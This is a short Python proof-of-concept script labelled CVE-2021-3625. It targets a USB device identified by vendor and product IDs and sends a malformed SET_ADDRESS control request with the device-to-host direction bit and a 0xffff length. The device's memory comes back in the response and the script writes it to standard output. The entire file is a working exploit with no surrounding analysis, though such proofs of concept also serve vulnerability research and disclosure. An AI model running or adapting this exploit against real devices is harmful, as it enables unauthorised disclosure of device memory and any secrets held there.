#!/usr/bin/python3

#
# CVE-2021-3625 POC
#
# Memory readout exploit for SET_ADDRESS
#

import sys

import usb.core

# get the device
usbdev = usb.core.find(idVendor=0x2fe3, idProduct=0x0100)

bmRequestType = (1 << 7) | (0 << 5)
bRequest = 0x05
wValue = 0x00
wIndex = 0x00
length = 0xffff

# SET_ADDRESS transfer to Host? why not ...
data = usbdev.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, length)
sys.stdout.buffer.write(data)
